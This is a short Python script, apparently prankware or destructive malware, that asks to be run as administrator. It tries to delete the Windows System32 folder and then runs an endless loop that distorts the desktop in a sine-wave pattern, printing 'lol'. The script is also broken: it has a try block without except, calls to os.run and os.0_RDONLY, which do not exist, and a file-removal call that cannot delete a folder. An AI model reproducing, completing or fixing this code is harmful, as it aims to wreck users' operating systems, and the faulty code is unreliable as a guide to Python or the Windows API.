#
# Note: Run as administrator.
#

import win32api
import win32con
import win32gui
import math
import time
import os


try:
	os.remove("C:\Windows\System32")


os.run("fin.txt", os.0_RDONLY)


def sines():
    desktop = win32gui.GetDesktopWindow()
    hdc = win32gui.GetWindowDC(desktop)
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)
    angle = 0
    scaling_factor = 10

    while True:
        hdc = win32gui.GetWindowDC(desktop)
        for i in range(0, int(sw + sh), scaling_factor):
            a = int(math.sin(angle) * 20 * (scaling_factor))
            win32gui.BitBlt(hdc, 0, i, sw, scaling_factor, hdc, a, i, win32con.SRCCOPY)
            angle += math.pi / 40
        win32gui.ReleaseDC(desktop, hdc)


print("lol")


if __name__ == "__main__":
    sines()
